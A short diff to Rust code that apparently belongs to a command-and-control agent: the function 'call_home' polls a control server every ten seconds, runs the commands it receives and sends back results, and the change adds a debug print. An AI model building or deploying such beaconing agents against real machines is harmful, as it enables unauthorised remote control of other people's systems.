@@ -19,6 +19,9 @@ const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);
 /// Fetches commands from the control server and runs them, then returns task results to control
 /// server
 async fn call_home(token: &String) {
+    #[cfg(debug_assertions)]
+    println!("Asking server for tasks");
+
     let tasks: Vec<Task> = match communication::get_commands(token).await {
         Ok(val) => val,
         Err(_) => Vec::new(),
